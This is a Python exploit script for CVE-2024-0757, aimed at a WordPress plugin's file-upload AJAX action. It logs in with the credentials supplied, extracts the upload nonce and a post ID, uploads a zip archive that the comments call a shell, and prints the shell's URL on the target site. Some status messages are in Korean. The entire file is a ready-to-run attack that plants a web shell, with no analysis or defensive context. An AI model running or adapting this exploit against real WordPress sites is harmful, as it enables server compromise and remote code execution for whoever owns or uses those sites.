import requests
import re
import sys
from art import text2art

cve_text = "cve-2024-0757"
fancy_text = text2art(cve_text, font='poison')
print(fancy_text)

# URLs for requesting
website_url = input("Enter your website url >> ")
wp_login_url = '{}/wp-login.php'.format(website_url)
wp_admin_url = '{}/wp-admin/'.format(website_url)
wp_new_post_url = "{}/wp-admin/post-new.php".format(website_url)
articulate_upload_url = "{}/wp-admin/admin-ajax.php".format(website_url)

# Credentials
wp_username = input("Enter your wordpress username >> ")
wp_password = input("Enter your wordpress password >> ")
print()

with requests.Session() as s:

    # Login to wordpress
    datas={
        'log': wp_username,
        'pwd': wp_password,
        'wp-submit': 'Log In',
        'redirect_to': wp_admin_url,
        'testcookie': '1'
    }
    s.post(wp_login_url, data=datas)

    # Check Success login-
    resp = s.get(wp_admin_url)

    if len(resp.content) > 6000:
        print("[+] Login Success");

        # Extract wp-nonce
        new_post_page = s.get(wp_new_post_url)
        print(f"[+] Status code for {wp_new_post_url}: {new_post_page.status_code}") # 상태 코드 확인
        print(f"[+] First 200 characters of new_post_page content:\n{new_post_page.text[:200]}") # 페이지 내용 일부 확인

        pattern = r'"_nonce_upload_file":"([a-zA-Z0-9]+)"'
        wp_nonce_match = re.search(pattern, new_post_page.text)
        if wp_nonce_match:
            wp_nonce = wp_nonce_match.group(1)
            print("[+] wp_nonce: {}".format(wp_nonce))
        else:
            print("[-] wp_nonce 패턴을 찾을 수 없습니다. 웹페이지 소스를 확인하세요.")
            sys.exit(-1)

        # Extract post id
        pattern = r'<input type=\'hidden\' id=\'post_ID\' name=\'post_ID\' value=\'(\d+)\' />'
        post_id_match = re.search(pattern, new_post_page.text)
        if post_id_match:
            post_id = post_id_match.group(1)
            print("[+] post_id: {}".format(post_id))
        else:
            print("[-] post_id 패턴을 찾을 수 없습니다. 웹페이지 소스를 확인하세요.")
            sys.exit(-1)

        # Upload shell (zip file)
        zip_file = {"async-upload": ('files.zip', open('files.zip','rb'), 'application/x-zip-compressed')}
        datas={
            "chunk":"0",
            "chunks":"1",
            "_ajax_nonce": wp_nonce,
            "action":"articulate_upload_file"
        }

        upload_resp = s.post(articulate_upload_url, data=datas, files=zip_file)
        print("[+] File uploaded successfully")

        # {"OK":1,
        # "info":"Upload Complete!",
        # "folder":"files",
        # "path":"\/wp-content\/uploads\/articulate_uploads\/files\/index.html",
        # "name":{"file_name":"index.html","status":"index_html_file_found"},
        # "target":"\/var\/www\/html\/wp2024may\/wp-content\/uploads\/articulate_uploads\/files"}

        # Extract uploaded path
        pattern = r'"path"\:"(.*?)"\,'
        shell_path_match = re.search(pattern, upload_resp.text)
        if shell_path_match:
            shell_path = shell_path_match.group(1).replace("\/", "/")
            print("[+] shell: {}{}".format(website_url, shell_path))
            print()
        else:
            print("[-] 업로드된 쉘 경로를 찾을 수 없습니다.")

    else:
        print("[-] Login Failed!")
        sys.exit(-1)
